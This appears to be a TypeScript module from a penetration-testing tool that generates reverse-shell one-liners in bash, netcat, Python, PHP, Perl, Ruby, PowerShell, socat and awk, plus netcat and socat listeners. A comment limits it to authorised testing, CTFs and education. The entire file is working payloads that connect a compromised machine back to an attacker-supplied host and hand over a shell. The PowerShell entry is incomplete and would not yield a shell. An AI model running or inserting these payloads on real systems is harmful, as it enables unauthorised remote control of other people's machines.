// Parameterised reverse-shell one-liners (standard pentest cheatsheet content,
// the same as revshells.com / PayloadsAllTheThings). Generation is 100% local.
//
// For authorised penetration testing, CTFs and security education only.

export interface RevShell {
  name: string;
  tag: string;
  build: (host: string, port: string) => string;
}

export const REV_SHELLS: RevShell[] = [
  {
    name: 'Bash -i',
    tag: 'bash',
    build: (h, p) => `bash -i >& /dev/tcp/${h}/${p} 0>&1`,
  },
  {
    name: 'Bash 196',
    tag: 'bash',
    build: (h, p) => `0<&196;exec 196<>/dev/tcp/${h}/${p}; sh <&196 >&196 2>&196`,
  },
  {
    name: 'Bash read line',
    tag: 'bash',
    build: (h, p) =>
      `exec 5<>/dev/tcp/${h}/${p};cat <&5 | while read line; do $line 2>&5 >&5; done`,
  },
  {
    name: 'nc mkfifo',
    tag: 'netcat',
    build: (h, p) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${h} ${p} >/tmp/f`,
  },
  {
    name: 'nc -e',
    tag: 'netcat',
    build: (h, p) => `nc -e /bin/sh ${h} ${p}`,
  },
  {
    name: 'ncat',
    tag: 'netcat',
    build: (h, p) => `ncat ${h} ${p} -e /bin/bash`,
  },
  {
    name: 'Python3',
    tag: 'python',
    build: (h, p) =>
      `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${h}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'`,
  },
  {
    name: 'PHP',
    tag: 'php',
    build: (h, p) => `php -r '$sock=fsockopen("${h}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'`,
  },
  {
    name: 'Perl',
    tag: 'perl',
    build: (h, p) =>
      `perl -e 'use Socket;$i="${h}";$p=${p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
  },
  {
    name: 'Ruby',
    tag: 'ruby',
    build: (h, p) =>
      `ruby -rsocket -e'f=TCPSocket.open("${h}",${p}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
  },
  {
    name: 'PowerShell',
    tag: 'windows',
    build: (h, p) =>
      `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${h}",${p});`,
  },
  {
    name: 'socat',
    tag: 'socat',
    build: (h, p) => `socat TCP:${h}:${p} EXEC:/bin/sh`,
  },
  {
    name: 'awk',
    tag: 'awk',
    build: (h, p) =>
      `awk 'BEGIN {s = "/inet/tcp/0/${h}/${p}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`,
  },
];

export interface Listener {
  name: string;
  build: (port: string) => string;
}

export const LISTENERS: Listener[] = [
  { name: 'netcat', build: (p) => `nc -lvnp ${p}` },
  { name: 'ncat', build: (p) => `ncat -lvnp ${p}` },
  { name: 'socat (TTY)', build: (p) => `socat file:\`tty\`,raw,echo=0 TCP-L:${p}` },
];
